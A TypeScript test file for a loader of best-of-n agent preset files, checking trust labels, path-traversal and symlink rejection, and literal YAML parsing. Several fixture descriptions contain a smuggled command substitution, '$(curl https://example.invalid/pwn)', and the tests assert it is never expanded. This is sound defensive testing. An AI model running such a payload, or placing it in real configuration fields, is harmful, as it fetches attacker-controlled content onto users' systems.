import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { loadBestOfNPresetCatalog } from "../best-of-n-presets.js";

function withTempHome(run: (root: string) => void) {
	const root = mkdtempSync(join(tmpdir(), "pi-prompt-best-of-n-presets-"));
	const previousHome = process.env.HOME;
	process.env.HOME = root;
	try {
		run(root);
	} finally {
		process.env.HOME = previousHome;
		rmSync(root, { recursive: true, force: true });
	}
}

test("loadBestOfNPresetCatalog discovers user and project presets with trust metadata", () => {
	withTempHome((root) => {
		const cwd = join(root, "project");
		mkdirSync(join(root, ".pi", "agent"), { recursive: true });
		mkdirSync(join(cwd, ".pi"), { recursive: true });
		writeFileSync(
			join(root, ".pi", "agent", "best-of-n-presets.json"),
			JSON.stringify({
				presets: {
					quick: { defaultModel: "openai/gpt-5.4", workers: [{ agent: "delegate", count: 2 }] },
				},
			}),
		);
		writeFileSync(
			join(cwd, ".pi", "best-of-n-presets.json"),
			JSON.stringify({
				presets: {
					strict: {
						description: "project $(curl https://example.invalid/pwn)",
						defaultModel: "anthropic/claude-sonnet-4-20250514",
						maxModelCalls: 4,
						workers: [{ agent: "delegate", count: 2 }],
						reviewers: [{ agent: "reviewer" }],
					},
				},
			}),
		);

		const catalog = loadBestOfNPresetCatalog(cwd);

		assert.equal(catalog.diagnostics.length, 0);
		assert.deepEqual(catalog.discoveredPresets.map((preset) => preset.name), ["quick", "strict"]);
		assert.deepEqual(
			catalog.discoveredPresets.map((preset) => ({
				name: preset.name,
				sourceKind: preset.sourceKind,
				trustLabel: preset.trustLabel,
				defaultModel: preset.defaultModel,
				maxModelCalls: preset.maxModelCalls,
				workerCount: preset.workerCount,
				reviewerCount: preset.reviewerCount,
				hasFinalApplier: preset.hasFinalApplier,
			})),
			[
				{
					name: "quick",
					sourceKind: "user",
					trustLabel: "trusted-user",
					defaultModel: "openai/gpt-5.4",
					maxModelCalls: undefined,
					workerCount: 2,
					reviewerCount: 0,
					hasFinalApplier: false,
				},
				{
					name: "strict",
					sourceKind: "project",
					trustLabel: "untrusted-project-approval-required",
					defaultModel: "anthropic/claude-sonnet-4-20250514",
					maxModelCalls: 4,
					workerCount: 2,
					reviewerCount: 1,
					hasFinalApplier: false,
				},
			],
		);
		assert.equal(catalog.discoveredPresets[1]?.description, "project $(curl https://example.invalid/pwn)");
		assert.equal(catalog.discoveredPresets[1]?.sourcePath, join(cwd, ".pi", "best-of-n-presets.json"));
	});
});

test("loadBestOfNPresetCatalog parses static YAML presets without expanding literals", () => {
	withTempHome((root) => {
		const cwd = join(root, "project");
		mkdirSync(join(cwd, ".pi"), { recursive: true });
		writeFileSync(
			join(cwd, ".pi", "best-of-n-presets.yaml"),
			[
				"---",
				"presets:",
				"  yamlPreset:",
				"    description: \"literal $(curl https://example.invalid/pwn)\"",
				"    defaultModel: openai/gpt-5.4",
				"    maxModelCalls: 3",
				"    workers:",
				"      - subagent: true",
				"        count: 2",
				"    reviewers:",
				"      - agent: reviewer",
				"...",
				"",
			].join("\n"),
		);

		const catalog = loadBestOfNPresetCatalog(cwd);

		assert.equal(catalog.diagnostics.length, 0);
		const preset = catalog.discoveredPresets[0];
		assert.equal(preset?.name, "yamlPreset");
		assert.equal(preset.description, "literal $(curl https://example.invalid/pwn)");
		assert.equal(preset.workerCount, 2);
		assert.equal(preset.reviewerCount, 1);
	});
});

test("loadBestOfNPresetCatalog fails closed for invalid project presets and path traversal names", () => {
	withTempHome((root) => {
		const cwd = join(root, "project");
		mkdirSync(join(root, ".pi", "agent"), { recursive: true });
		mkdirSync(join(cwd, ".pi"), { recursive: true });
		writeFileSync(join(root, ".pi", "agent", "best-of-n-presets.json"), JSON.stringify({ presets: { safe: { workers: [{ agent: "delegate" }] } } }));
		writeFileSync(
			join(cwd, ".pi", "best-of-n-presets.json"),
			JSON.stringify({
				presets: {
					safe: { workers: [] },
					"../escape": { workers: [{ agent: "delegate" }] },
					projectOnly: { workers: [{ agent: "delegate" }] },
				},
			}),
		);

		const catalog = loadBestOfNPresetCatalog(cwd);

		assert.equal(catalog.projectFileInvalid, false);
		assert.equal(catalog.presets.has("safe"), false);
		assert.equal(catalog.presets.has("projectOnly"), true);
		assert.equal(catalog.invalidPresetNames.has("../escape"), true);
		assert.equal(catalog.diagnostics.filter((diagnostic) => diagnostic.code === "invalid-best-of-n-preset").length, 2);
	});
});

test("loadBestOfNPresetCatalog lets project presets shadow same-name user presets", () => {
	withTempHome((root) => {
		const cwd = join(root, "project");
		mkdirSync(join(root, ".pi", "agent"), { recursive: true });
		mkdirSync(join(cwd, ".pi"), { recursive: true });
		writeFileSync(join(root, ".pi", "agent", "best-of-n-presets.json"), JSON.stringify({
			presets: { quick: { defaultModel: "openai/gpt-5.4", workers: [{ agent: "delegate" }] } },
		}));
		writeFileSync(join(cwd, ".pi", "best-of-n-presets.yml"), [
			"presets:",
			"  quick:",
			"    defaultModel: anthropic/claude-sonnet-4-20250514",
			"    workers:",
			"      - agent: worker",
			"        count: 2",
			"",
		].join("\n"));

		const catalog = loadBestOfNPresetCatalog(cwd);

		assert.equal(catalog.diagnostics.length, 0);
		assert.equal(catalog.discoveredPresets.length, 1);
		assert.equal(catalog.discoveredPresets[0]?.name, "quick");
		assert.equal(catalog.discoveredPresets[0]?.source, "project");
		assert.equal(catalog.discoveredPresets[0]?.defaultModel, "anthropic/claude-sonnet-4-20250514");
		assert.equal(catalog.discoveredPresets[0]?.workerCount, 2);
		assert.equal(catalog.discoveredPresets[0]?.filePath, join(cwd, ".pi", "best-of-n-presets.yml"));
	});
});

test("loadBestOfNPresetCatalog rejects symlinked project preset files before parsing", () => {
	withTempHome((root) => {
		const cwd = join(root, "project");
		const outside = join(root, "outside");
		mkdirSync(join(root, ".pi", "agent"), { recursive: true });
		mkdirSync(join(cwd, ".pi"), { recursive: true });
		mkdirSync(outside, { recursive: true });
		writeFileSync(join(root, ".pi", "agent", "best-of-n-presets.json"), JSON.stringify({ presets: { fallback: { workers: [{ agent: "delegate" }] } } }));
		writeFileSync(join(outside, "evil.json"), JSON.stringify({ presets: { evil: { workers: [{ agent: "delegate" }] } } }));
		symlinkSync(join(outside, "evil.json"), join(cwd, ".pi", "best-of-n-presets.json"));

		const catalog = loadBestOfNPresetCatalog(cwd);

		assert.equal(catalog.projectFileInvalid, true);
		assert.equal(catalog.presets.size, 0);
		assert.match(catalog.diagnostics.map((diagnostic) => diagnostic.message).join("\n"), /symlinked preset paths/);
	});
});
